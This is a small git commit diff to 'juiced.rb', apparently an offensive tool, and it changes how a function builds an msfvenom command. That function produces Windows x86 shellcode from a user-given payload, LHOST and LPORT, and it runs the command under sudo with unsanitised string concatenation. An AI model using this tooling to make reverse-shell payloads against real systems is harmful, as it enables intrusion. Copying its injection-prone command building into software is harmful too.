ab48fd0b4eca779b375510a65b8bbf9f4eec8371
ch33kyf3ll0w <ch33kyf3ll0w@users.noreply.github.com>
2015-04-03 12:58:18 -0500

    Update juiced.rb

--- juiced.rb
+++ juiced.rb
@@ -180,7 +180,7 @@ def generate_shellcode (payload, lhost, lport)
 	newVar = ''
 	formattedShellcode = ''
 	#Build the msfvenom command from user input
-	command = ("sudo /usr/local/share/msf/msfvenom -p " + payload + " LHOST=" + lhost +" LPORT=" + lport + " -a x86 --platform windows -f c")
+	command = ("sudo msfvenom -p " + payload + " LHOST=" + lhost +" LPORT=" + lport + " -a x86 --platform windows -f c")
 	puts "Now running " +  command
 	puts " "
 	#Executes the built msfvenom command and assigns output to variable newVar
